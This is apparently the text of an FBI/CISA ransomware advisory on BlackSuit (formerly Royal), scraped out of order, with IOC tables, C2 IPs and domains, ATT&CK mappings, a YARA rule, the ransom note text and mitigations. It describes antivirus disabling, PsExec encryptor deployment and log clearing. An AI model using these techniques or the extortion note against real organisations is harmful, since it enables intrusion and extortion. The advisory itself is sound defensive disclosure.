HKEY_USERS\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Run (Value == socks_powershell)
 
Executes socks.ps1 on reboot


share$.zip
e3d7c012040962acd66f395d1c5c5f73f305aa1058f2111e8e37d9cb213b80c4
Contains _COPY.bat, PsExec.exe, etmc.exe, and _EXEC.bat to deploy encryptor (etmc.exe) across environment using domain admin credentials


socss.exe
C798B2690C5F16EB2917A679AF3117CFE9C7060FA8BC84FFC3159338EF33508E
Malware


qq.exe
3c8c1b1f53e0767b7291bb1ae605ffa62a93e9c8cc783e4ca47ac84b48320d59
 


gomer.exe
 
A renamed executable of GMER used for defense evasion


288-csrss.exe
ee6ec2810910c6d2a2957f041edd1e39dca4266a1cc8009ae6d7315aba9196f5
 


372-winlogon.exe
68c57daed0e5899c49b827042bcf3bbeba33b524bd83315a44d889721664dc34
 


776-svchost.exe
 bbb7404419f91f82cedfec915931a9339f04165b27d8878d63827c9ee421ed62
 


Exe.exe, aaaa.exe, qq.exe
338228a3e79f3993abc102cbac2ff253c84965213d59ac30892538cdd9b0a22b
Ransomware file


Mwntv.sys
6332f189cc71df646ff0f1b9b02a005c9ebda3fe7b9712976660746913b030de
Potential Tool Ingress


Un_A.exe
 
Malicious binary for attempting to disable/uninstall security software


Un_B.erxe
 
Malicious binary for attempting to disable/uninstall security software





Table 11: Batch Script Tools Used by BlackSuit Ransomware Operators and Hash Values


Filename
Description
Hash Value – SHA-256




2.bat
Batch Script to copy and execute encryptor
3041dfc13f356c2f0133a9c11a258f87cb7de1e17bc435e9b623d74bc5e1c6be


C:\share$\_EXEC.bat
Execute encrypter
8F87A1542EE790623896BBAAB933D1883484DE02A7B3D65D6C791D50173A923D


fstart.bat
A batch script used to enable remote services, perform anti-forensics, and enable clear-text passwords in memory
 


NLA.bat
A batch script used to disable Network Level Authentication (NLA) for Remote Desktop Services (RDS)
 


av.bat
A batch script that searches for presence of an application and uninstalls it
 


systeminfo.bat
A batch script used for system enumeration
 


mv.bat
A batch script used to move the PsExec executable and delete the netscan executable
 





Table 12: IP addresses from BlackSuit Ransomware Deployments (from November 2023 to July 2024)


IP Address 
Time Range of Use
Description 




143[.]244[.]146[.]183:443
May 2024
Unknown C2 – potential SOCKS Proxy


45[.]141[.]87[.]218:9000
May 2024
Arechclient2 Backdoor/SecTopRAT


45[.]141[.]87[.]218:443
May 2024
Arechclient2 Backdoor/SecTopRAT


184.174.96[.]16
May 2024
Associated with download of the binary vm.dll


89.251.22[.]32
May 2024
Cobalt Strike


135.148.67[.]84
May 2024
Resolves to domain turnovercheck[.]com


180.131.145[.]85
May 2024
Associated with malicious PowerShell execution


180.131.145[.]61
May 2024
SystemBC Command & Control


138.199.53[.]226
Feb 2024
 


184.166.211[.]74
Feb 2024
 


185.190.24[.]103
Feb 2024
 


5.181.234[.]58
Feb 2024
 


137.220.61[.]94
Nov – Feb 2024
connecting outbound from Socss.exe


193.37.69[.]116
Nov – Jan 2024
Associated with exfiltration


144.202.120[.]122
Nov 2023
socks1.ps1 backdoor; SystemBC Backdoor C2; www.recruitment-interview[.]org (C2 SystemBC)


104.21.58[.]219:443
Nov 2023
Cobalt Strike


141.98.80[.]181:80
Nov 2023
Cobalt Strike


144.202.120[.]122:433
Nov 2023
PowerShell Reverse Proxy


155.138.150[.]236:8088
Nov 2023
PowerShell Reverse Proxy


140.82.18[.]48
Nov 2023
 


141.98.80[.]181
Nov 2023
 


44.202.120[.]122
Nov 2023
 


45.76.225[.]156
Nov 2023
 





Table 13: Legitimate Files and Tools Used by Black Suit Ransomware (1 of 3)


File name
Hash Value – SHA-256
Description




share.exe
f02af8ffc37d1874b971307fdec80e33e583b56d9ebabda78a4b8ad038bc3bf0
Cobalt Strike


181.exe
b028eaa0ec452c6844881dc34be813834813a40591b89ea9a57dd4fb4084e477
Cobalt Strike – File name 


222wqc.exe
ae724dce252c7b05a84bc264993172cf86950d22744b5e3a1b15ba645d9d3733
Cobalt Strike


gmer.exe
 
GMER / Rootkit Hunter


PowerTool64.exe
 
PowerTool64 for hacking


Psexesvc.exe
141b2190f51397dbd0dfde0e3904b264c91b6f81febc823ff0c33da980b69944
Sysinternals



Socks5.ps1
Socks.ps1

25a6f82936134a6c5c0066f382530b9d6bf2c8da6feafe028f166b1a9d7283cf
PowerShell Reverse Proxy


netscan.exe
 
A network reconnaissance tool


3iSDtcX.exe
e87512ea12288acec611cf8e995c4ced3971d9e35c0c5dcfd9ee17c9e3ed913d
Putty suite


File.exe
f805dafb3c0b7e18aa7d8c96db8e8d4e9301ff619622d1aecc8080e0ecd9ebbe
Putty.exe. Possibly used for C2


Mwntv.sys
6332f189cc71df646ff0f1b9b02a005c9ebda3fe7b9712976660746913b030de
Potential Tool Ingress


AnyDesk
1cdafbe519f60aaadb4a92e266fff709129f86f0c9ee595c45499c66092e0499
Potential remote access tool


ScreenConnect
420db40d26d309d3dba3245abb91207f1bca050530545a8048f856e5840d22a2
Potential remote access tool


SharpShares.exe
 
Enumerate network shares


Networx.exe
 
Bandwidth utilization





Table 14: Legitimate Files and Tools Used by Black Suit Ransomware (2 of 3)


Filename
Hash Value – SHA-1
Description




181[.]exe
790d40cd16fb458bf99e3600bce29eca06d40b56
Cobalt Strike – Host name 





Table 15: Legitimate Files and Tools Used by Black Suit Ransomware (3 of 3)


Filename
File Path
Description




Anydesk.exe
C:\Program Files(x86)\AnyDesk\AnyDesk.exe
Remote Monitoring and Management (RMM) Tool


ehorus_display.exe
C:\Program Files\ehorus_agent\ehorus_display\ehorus_display.exe
RMM Tool


ehorus_launcher.exe
C:\Program Files\ehorus_agent\ehorus_launcher.exe
RMM Tool





Table 16: Domain(s) associated to BlackSuit Ransomware


Domain Name 
Description




Abbeymathiass[.]com
Cobalt Strike C2


Mail.abbeymathiass[.]com
Cobalt Strike C2


Store.abbeymathiass[.]com
Cobalt Strike C2


https://file[.]io/ScPd1KcJTtxO
Associated with download of the binary disabler.exe by threat actors


Mail.turnovercheck[.]com
Cobalt Strike C2


Store.turnovercheck[.]com
Cobalt Strike C2


turnovercheck[.]com
Cobalt Strike C2


Hourlyprofitstore[.]com
Cobalt Strike


IPs and Domains for downloads / C2 / exfiltration of communication

https://protect-us.mimecast[.]com/s/A2PyC31xN5IpzR0XUvzaAj?domain=5.181.157.8
https://protect-us.mimecast[.]com/s/CcsrC4xyO7fBK73ztjNfPl?domain=5.181.234.58
https://protect-us.mimecast[.]com/s/NwueC5yzP5IZLW4MulfSrc?domain=137.220.61.94
https://protect-us.mimecast[.]com/s/T3InC2kwM5hpzEOVU9S5zn?domain=147.135.36.162
https://protect-us.mimecast[.]com/s/teBrC1wvL8iMNE56tXga0n?domain=147.135.11.223






Table 17: BlackSuit Ransomware Note and Hash Value


File Name
Hash Value
Description 




readme.BlackSuit.txt
1743494f803bbcbd11150a4a8b7a2c5faba1223da607f67d24b18ca2d95d5ba3
Ransomware note



Ransom Note (New August 7, 2024)
Figure 1 shows the observed BlackSuit ransom notes delivered to victims.

Figure 1. BlackSuit Ransom Note



Your safety service did a really poor job of protecting your files against our professionals.
Extortioner named BlackSuit has attacked your system.
As a result all your essential files were encrypted and saved at a secure server for further use and publishing on the Web into the public realm.
Now we have all your files like: financial reports, intellectual property, accounting, law actions and complaints, personal files and so on and so forth. 
We are able to solve this problem in one touch.
We (BlackSuit) are ready to give you an opportunity to get all the things back if you agree to make a deal with us.
You have a chance to get rid of all possible financial, legal, insurance and many others risks and problems for a quite small compensation.
You can have a safety review of your systems.
All your files will be decrypted, your data will be reset, your systems will stay in safe.
Contact us through TOR browser using the link:













MITRE ATT&CK Tactics and Techniques
See Table 18 through Table 23 for all referenced threat actor tactics and techniques in this advisory, as well as corresponding detection and/or mitigation recommendations. For additional mitigations, see the Mitigations section.


Table 18: BlackSuit Actors ATT&CK Techniques for Resource Development


Technique Title
ID
Use




Acquire Access
T1650
BlackSuit actors may leverage brokers in support of gaining initial access.





Table 19: Cyber Threat Actors ATT&CK Techniques for Initial Access


Technique Title
ID
Use




Remote Services: Remote Desktop Protocol
T1021.001
BlacSuit actors use RDP compromise as secondary initial access vector.


External Remote Services
T1133
BlackSuit actors gain initial access through a variety of RMM software.


Exploit Public Facing Application
T1190
BlackSuit actors gain initial access through public-facing applications.


Phishing
T1566
BlackSuit actors most commonly gain initial access to victim networks via phishing. 


Phishing: Spear phishing Attachment
T1566.001
BlackSuit actors used malicious PDF document attachments in phishing campaigns.


Phishing: Spear phishing Link
T1566.002
The actors gain initial access using malvertising links via emails and public-facing sites.





Table 20: Cyber Threat Actors ATT&CK Techniques for Privilege Escalation


Technique Title 
ID
Use




(New August 7, 2024) Valid Accounts
T1078
BlackSuit actors used a legitimate admin account to gain access privileges to the domain controller.


Valid Accounts: Domain Accounts
T1078.002
BlackSuit actors used encrypted files to create new admin user accounts.





Table 21: Cyber Threat Actors ATT&CK Techniques for Defense Evasion


Technique Title
ID
Use




Remote Services: Remote Desktop Protocol
T1021.001
BlackSuit actors used valid accounts to move laterally through the domain controller using RDP.


Indicator Removal: Clear Windows Event Logs
T1070.001
BlackSuit actors deleted shadow files and system and security logs after exfiltration.


Automated Collection
T1119
BlackSuit actors used registry keys to auto-extract and collect files.


Domain Policy Modification: Group Policy Modification
T1484.001
BlackSuit actors modified Group Policy Objects to subvert antivirus protocols.


Impair Defenses: Disable or Modify Tools
T1562.001
BlackSuit actors deactivated antivirus protocols.





Table 22: Cyber Threat Actors ATT&CK Techniques for Command and Control


Technique Title
ID
Use




Ingress Tool Transfer
T1105
BlackSuit actors used C2 infrastructure to download multiple tools.


Protocol Tunneling
T1572
BlackSuit actors used an encrypted SSH tunnel to communicate within C2 infrastructure.





Table 23: Cyber Threat Actors ATT&CK Techniques for Impact


Technique Title
ID
Use




Data Encrypted for Impact
T1486
BlackSuit actors encrypted data to determine which files were being used or blocked by other applications.



Detection Methods






(New August 7, 2024) Please reference YARA rule below to aid in detecting BlackSuit activity. Note: The YARA rule is derived from FBI investigations and is not guaranteed to detect confirmed malicious activity.



private rule is_executable {    condition:        uint32(uint32(0x3C)) == 0x00004550}rule obfuscates_dlls {            strings:                                    // Code for unscrambling names of true DLL imports                        $code_load_obfuscated = {                                                                                                            c6 84 24 ?? 00 00 00 ??                                                                                                            c6 84 24 ?? 00 00 00 ??                                                                                                            c6 84 24 ?? 00 00 00 ??                                                                                                            c6 84 24 ?? 00 00 00 ??                                                                                                            c6 84 24 ?? 00 00 00 ??                                                                                                            c6 84 24 ?? 00 00 00 ??                                                                                                            c6 84 24 ?? 00 00 00 ??                                                                                                            c6 84 24 ?? 00 00 00 ??                                                                                                }                                    // c6 84 24 ?? 00 00 00 ??      | MOV byte ptr [ESP + ??], ??                                                $code_deobfuscate = { 99 f7 ?? 8d ?? ?? 99 f7 ?? 88}                                    // 99                                                     | CDQ                                    // f7 ??                                     | IDIV ??                                    // 8d ?? ??                                           | LEA ??, ??                                    // 99                                                     | CDQ                                    // f7 ??                                     | IDIV ??                                    // 88                                                     | MOV            condition:                        all of them}rule calls_rsa_function {            strings:                                                // Code for function calls using RSA key                        $code_rsa_function_1 = { 8d4c2410 6a?? 6a?? 51 6a?? 6a?? 6a?? 68???????? ffd0 }                                    // 8d 4c 24 10                          | LEA ECX, [esp + 0x10]                                    // 6a ??                                                | PUSH ??                                    // 6a ??                                                | PUSH ??                                    // 51                                                     | PUSH ECX                                    // 6a ??                                                | PUSH ??                                    // 6a ??                                                | PUSH ??                                    // 6a ??                                                | PUSH ??                                    // 68 ?? ?? ?? ??                     | PUSH (address of RSA string)                                    // ff d0                                      | CALL EAX                                                $code_rsa_function_2 = { 8d4c2410 6a?? 6a?? 51 56 6a?? 6a?? 68???????? ffd0 }                                    // 8d 4c 24 10                          | LEA ECX, [esp + 0x10]                                    // 6a ??                                                | PUSH ??                                    // 6a ??                                                | PUSH ??                                    // 51                                                     | PUSH ECX                                    // 56                                                     | PUSH ESI                                    // 6a ??                                                | PUSH ??                                    // 6a ??                                                | PUSH ??                                    // 68 ?? ?? ?? ??                     | PUSH (address of RSA string)                                    // ff d0                                      | CALL EAX            condition:                        any of them}rule xor_decoder_functions {            strings:                                    // Functions 402e00 and 402f00 both appear to contain a xor-decoding loop                                                // 402e00                        $code_xor_loop_1 = { 0f a4 ce ?? 0f ac d5 ?? c1 e1 ?? c1 ea ?? 0b cd 0b f2 99 33 c8 }                                    // 0f a4 ce ??                           | SHLD ESI, param_1, ??                                    // 0f ac d5 ??                           | SHRD EBP, EDX, ??                                    // c1 e1 ??                                           | SHL param_1, ??                                    // c1 ea ??                                           | SHR EDX, 0x19                                    // 0b cd                                                | OR param_1, EBP                                    // 0b f2                                     | OR ESI, EDX                                    // 99                                                     | CDQ                                    // 33 c8                                                | XOR param_1, EAX                                                // 402f00                        $code_xor_loop_2 = { 0f a4 ce ?? c1 ea ?? 0b f2 c1 e1 ?? 0b c8 0f be c3 8a 1f 99 33 c8 }                                    // 0f a4 ce ??                           | SHLD ESI, param_1, ??                                    // c1 ea ??                                           | SHR EDX, ??                                    // 0b f2                                     | OR ESI, EDX                                    // c1 e1 ??                                           | SHL, param_1, ??                                    // 0b c8                                                | OR param_1, EDX                                    // 0f be c3                                            | MOVSX EAX, BL                                    // 8a 1f                                     | BL, byte ptr [EDI]                                    // 99                                                     | CDQ                                    // 33 c8                                                | XOR param_1, EAX                        condition:                any of them}rule win_BlackSuit_manual {    meta:        author = ""CVH - Raleigh""        date = ""2024-07-12""        version = ""1""        description = ""Detects win.BlackSuit. Rules were manually constructed and results should not be considered conclusive.""        malpedia_reference = ""https://malpedia.caad.fkie.fraunhofer.de/details/win.BlackSuit""    strings:                        // Somehow keeps this in plaintext, although in UTF-16                        $string_readme = ""readme.BlackSuit.txt"" nocase wide ascii                                                // RSA key for encrypting AES encryption key present in plaintext                        $string_rsa_key = ""BEGIN RSA PUBLIC KEY"" nocase wide ascii                                                // Unusual debug strings                        $string_debug_1 = "".rdata$voltmd""                        $string_debug_2 = "".rdata$zzzdbg""                                                // Relevant functions calls                        $import_1 = ""MultiByteToWideChar""                        $import_2 = ""EnterCriticalSection""                        $import_3 = ""GetProcessHeap""                                                                            condition:                (is_executable and $string_readme)                                                Or                                    ($string_readme and                                                            (obfuscates_dlls or calls_rsa_function or xor_decoder_functions)                                                )                                                            or                                                            2 of (obfuscates_dlls, calls_rsa_function, xor_decoder_functions)                                                or                                                1 of (obfuscates_dlls, calls_rsa_function, xor_decoder_functions) and any of them            }



Mitigations
Network Defenders
The FBI and CISA recommend network defenders implement the mitigations below to improve your organization’s cybersecurity posture based on BlackSuit actor’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Implement a recovery planto maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute for Standards and Technology (NIST) standards for developing and managing password policies.

Use longer passwords consisting of at least 8 characters and no more than 64 characters in length;
Store passwords in hashed format using industry-recognized password managers;
Add password user “salts” to shared login credentials;
Avoid reusing passwords;
Implement multiple failed login attempt account lockouts;
Disable password “hints;”
Refrain from requiring password changes more frequently than once per year. 
Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher. 
Require administrator credentials to install software.


Keep all operating systems, software, and firmware up to date [CPG 1.E]. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems.
Require Phishing-Resistant multifactor authentication to administrator accounts [CPG 2.H], and require standard MFA for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems. 
Segment networks [CPG 2.F] to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. 
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool [CPG 3.A]. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host. 
Install, regularly update, and enable real time detection for antivirus software on all hosts.
Implement Secure Logging Collection and Storage Practices [CPG 2.T]. Learn more on logging best practices by referencing CISA’s Logging Made Easy resources.
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts.
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege.
Disable unused ports.
Implement and Enforce Email Security Policies [CPG 2.M].
Disable Macros by Default [CPG 2.N].
Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails.
Implement time-based access for accounts set at the admin level and higher. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task. 
Disable command-line and scripting activities and permissions. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally. 
Maintain offline backups of data, and regularly maintain backup and restoration [CPG 2.R]. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data. 
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.

Software Manufacturers
The above mitigations apply to enterprises and critical infrastructure organizations with on-premises or hybrid environments. Recognizing that insecure software is the root cause of the majority of these flaws and that the responsibility should not be on the end user, CISA urges software manufacturers to implement the following to reduce the prevalence of <identified or exploited issues (e.g., misconfigurations, weak passwords, and other weaknesses identified and exploited through the assessment team)>:

Embed security into product architecture throughout the entire software development lifecycle (SDLC).
Mandate MFA, ideally phishing-resistant MFA, for privileged users and make MFA a default, rather than opt-in, feature.

These mitigations align with tactics provided in the joint guide Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software. CISA urges software manufacturers to take ownership of improving the security outcomes of their customers by applying these and other secure by design tactics. By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing security software and logs, monitoring, and making routine updates.
For more information on secure by design, see CISA’s Secure by Design webpage.
Validate Security Controls
In addition to applying mitigations, the FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The FBI and CISA recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 18 – Table 23).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

The FBI and CISA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
Resources

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.Note: The joint Ransomware Guide provides preparation, prevention, and mitigation best practices as well as a ransomware response checklist.
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.

Reporting
Your organization has no obligation to respond or provide information back to the FBI in response to this joint CSA. If, after reviewing the information provided, your organization decides to provide information to the FBI, reporting must be consistent with applicable state and federal laws.
The FBI is interested in any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with BlackSuit actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.
Additional details of interest include: a targeted company point of contact, status, and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators.
The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI’s Internet Crime Complain Center (IC3), a local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center (SayCISA@cisa.dhs.gov or by calling 1-844-Say-CISA (1-844-729-2472).
Disclaimer
Your organization has no obligation to respond or provide information in response to this product. If, after reviewing the information provided, your organization decides to provide information to the authoring agencies, it must do so consistent with applicable state and federal law.
The information in this report is being provided “as is” for informational purposes only. FBI and CISA do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI and CISA.
Acknowledgements
The DFIR Report contributed to this advisory.
Version History
January 31, 2023: Initial Release (Royal Ransomware)November 13, 2023: First Update (Royal Ransomware)August 7, 2024: Updated title from “Royal Ransomware” to “BlackSuit Ransomware”; updates noted throughout.August 14, 2024: Updated STIX filesAugust 19, 2024: Updated STIX filesAugust 27, 2024: Updated STIX files






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1190', 'T1484.001', 'T1021.001', 'T1566.002', 'T1105', 'T1566', 'T1572', 'T1562.001', 'T1486', 'T1566.001', 'T1133', 'T1070.001', 'T1650', 'T1078.002', 'T1078', 'T1119'}","






Actions for Organizations to Take Today to Mitigate Cyber Threats Related to BlackSuit Ransomware Activity




Prioritize remediating known exploited vulnerabilities.
Train users to recognize and report phishing attempts.
Enable and enforce multifactor authentication.







Summary
Note: This joint Cybersecurity Advisory is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
Note: This advisory, originally published March 2, 2023, has been updated four times:

November 13, 2023: The advisory was updated to share new Royal TTPs and IOCs.
August 7, 2024: The advisory was updated to notify network defenders of the rebrand of “Royal” ransomware actors to “BlackSuit.” The update includes new TTPs, IOCs, and detection methods related to BlackSuit ransomware. “Royal” was updated to “BlackSuit” throughout unless referring to legacy Royal activity. Updates and new content are noted.
August 14, 2024: The STIX files from the previous update (08/07/2024) were refreshed.
August 27, 2024: The STIX files from the (08/19/2024) update were refreshed.

(New August 7, 2024) The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint advisory to disseminate known BlackSuit ransomware IOCs and TTPs identified through FBI threat response activities and third-party reporting as recently as of July 2024. BlackSuit ransomware is the evolution of the ransomware previously identified as Royal ransomware, which was used from approximately September 2022 through June 2023. BlackSuit shares numerous coding similarities with Royal ransomware and has exhibited improved capabilities. 
(Updated August 7, 2024) BlackSuit conducts data exfiltration and extortion prior to encryption and then publishes victim data to a leak site if a ransom is not paid. Phishing emails are among the most successful vectors for initial access by BlackSuit threat actors. After gaining access to victims’ networks, BlackSuit actors disable antivirus software and exfiltrate large amounts of data before ultimately deploying the ransomware and encrypting the systems. 
(Updated August 7, 2024) Ransom demands have typically ranged from approximately $1 million to $10 million USD, with payment demanded in Bitcoin. BlackSuit actors have demanded over $500 million USD in total and the largest individual ransom demand was $60 million. BlackSuit actors have exhibited a willingness to negotiate payment amounts. Ransom amounts are not part of the initial ransom note, but require direct interaction with the threat actor via a .onion URL (reachable through the Tor browser) provided after encryption. Recently, an uptick was observed in the number of instances where victims received telephonic or email communications from BlackSuit actors regarding the compromise and ransom. BlackSuit uses a leak site to publish victim data based on non-payment.
FBI and CISA encourage organizations to implement the recommendations found in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.
Download the PDF version of this report:


AA23-061A #StopRansomware: BlackSuit (Royal) Ransomware
(PDF,       660.84 KB
  )


For a downloadable copy of IOCs, see:


AA23-061A STIX XML (MAR 2023)
(XML,       114.26 KB
  )




AA23-061A STIX XML (NOV 2023 Update)
(XML,       152.94 KB
  )




AA23-061A STIX JSON (NOV 2023 Update)
(JSON,       113.96 KB
  )




AA23-061A STIX XML (BlackSuit)
(XML,       242.82 KB
  )




AA23-061A STIX JSON (BlackSuit)
(JSON,       162.62 KB
  )


Technical Details
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 15. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Initial Access
BlackSuit uses a unique partial encryption approach that allows the threat actor to choose a specific percentage of data in a file to encrypt. This approach allows the actor to lower the encryption percentage for larger files, which helps evade detection, and also significantly improves ransomware speed.,1, In addition to encrypting files, BlackSuit actors also engage in double extortion tactics in which they threaten to publicly release the exfiltrated data if the victim does not pay the ransom.
BlackSuit actors gain initial access to victim networks in several ways, including:

Phishing. According to third-party reporting, BlackSuit actors most commonly gain initial access to victim networks via phishing emails,.

According to open source reporting, victims have unknowingly installed malware that delivers BlackSuit ransomware after receiving phishing emails containing malicious PDF documents, and malvertising,.,2,


Remote Desktop Protocol (RDP). The second most common vector (around 13.3% of incidents) BlackSuit actors use for initial access is RDP compromise,. 
Public-facing applications. FBI has observed BlackSuit actors gain initial access through exploiting vulnerable public-facing applications,.
Brokers. Reports from trusted third-party sources indicate that BlackSuit actors may leverage initial access brokers to gain initial access and source traffic by harvesting virtual private network (VPN) credentials from stealer logs,.

Command and Control
Once BlackSuit actors gain access to a network, they communicate with command and control (C2) infrastructure and download multiple tools,. Legitimate Windows software is repurposed by BlackSuit actors to strengthen their foothold within the victim’s network. Ransomware operators often use open source projects to aid their intrusion activities.
Historically, Royal actors were observed leveraging Chisel, Secure Shell (SSH) client, PuTTY, OpenSSH, and MobaXterm, to communicate with their C2 infrastructure.
Lateral Movement and Persistence
(Updated August 7, 2024) Historically, Royal threat actors used RDP and legitimate operating system (OS) diagnostic tools to move laterally across a network,. BlackSuit actors used RDP and PsExec as well but also use SMB, to move laterally. In one confirmed case, BlackSuit actors used a legitimate admin account, to remotely log on to the domain controller via SMB. Once on the domain controller, the threat actor deactivated antivirus software, by modifying Group Policy Objects,.
(Updated August 7, 2024) FBI observed BlackSuit actors using legitimate remote monitoring and management (RMM) software to maintain persistence in victim networks,. 
(New August 7, 2024) BlackSuit actors use SystemBC and Gootloader malware to load additional tools and maintain persistence.
Discovery and Credential Access
(New August 7, 2024) BlackSuit actors have been observed using SharpShares and SoftPerfect NetWorx to enumerate victim networks. The publicly available credential stealing tool Mimikatz and password harvesting tools from Nirsoft have also been found on victim systems. Tools such as PowerTool and GMER are often used to kill system processes.
Exfiltration
BlackSuit actors exfiltrate data from victim networks by repurposing legitimate cyber penetration testing tools, such as Cobalt Strike, and malware tools/derivatives, such as Ursnif/Gozi, for data aggregation and exfiltration. According to third-party reporting, BlackSuit actors’ first hop in exfiltration and other operations is usually a U.S. IP address. 
(New August 7, 2024) BlackSuit actors also use RClone and Brute Ratel for exfiltration.
Encryption
Before starting the encryption process, BlackSuit actors:

Use Windows Restart Manager to determine whether targeted files are currently in use or blocked by other applications,.,1,
Use Windows Volume Shadow Copy service (vssadmin.exe) to delete shadow copies to inhibit system recovery.,1,

FBI has found numerous batch (.bat) files on impacted systems which are typically transferred as an encrypted 7zip file. Batch files create a new admin user, force a group policy update, set pertinent registry keys to auto-extract, and execute the ransomware, monitor the encryption process, and delete files upon completion—including Application, System, and Security event logs,. Registry Keys created can be modified and deleted to enable persistence on the victim’s system. 
Malicious files have been found in victim networks in the following directories:

C:\Temp\
C:\Users\<user>\AppData\Roaming\
C:\Users\<users>\
C:\ProgramData\

Root C:\ directory has also served as a storage location for malicious files. BlackSuit actors have been observed using legitimate software and open source tools during ransomware operations.
Indicators of Compromise (IOCs)
See Table 1 through Table 5 for Royal ransomware IOCs obtained by FBI during threat response activities as of January 2023.
(New November 13, 2023) See Table 6 and Table 7 for Royal and BlackSuit Ransomware IOCs as of June 2023. See Table 8 for a list of legitimate software used by Royal and BlackSuit threat actors identified through FBI investigations as of June 2023.
(New August 7, 2024) See Table 9 through Table 15 for BlackSuit ransomware IOCs obtained by FBI during threat response activities as of July 2024 and Figure 1 for a sample ransom note.
Disclaimer: Some of the observed IP addresses are several years old. FBI and CISA recommend vetting or investigating these IP addresses prior to taking forward-looking action, such as blocking.
Royal IOCs as of January 2023












 



Royal and BlackSuit IOCs as of June 2023 (New November 13, 2023)






BlackSuit threat actors have been observed using legitimate software and open source tools during ransomware operations. Threat actors have been observed using open source network tunneling tools such as Chisel and Cloudflared, as well as Secure Shell (SSH) Client, OpenSSH, and MobaXterm to establish SSH connections. The publicly available credential stealing tool Mimikatz and password harvesting tools from Nirsoft have also been found on victim systems. Legitimate RMM tools have also been observed as backdoor access vectors. Some legitimate software and open source tools can be found in Table 8.



IOCs as of July 2024 (New August 7, 2024)
Disclaimer: Several of these observed IP addresses were first observed as early as 2023, although the most recent are from July of 2024 and have been historically linked to BlackSuit (formerly known as Royal) Ransomware. IP addresses in this advisory were maliciously used during the time range highlighted below, and may have been used for legitimate purposes outside of that time span. FBI and CISA recommend these IP addresses be investigated or vetted by organizations prior to taking action, such as blocking.


















Ransom Note (New August 7, 2024)
Figure 1 shows the observed BlackSuit ransom notes delivered to victims.










MITRE ATT&CK Tactics and Techniques
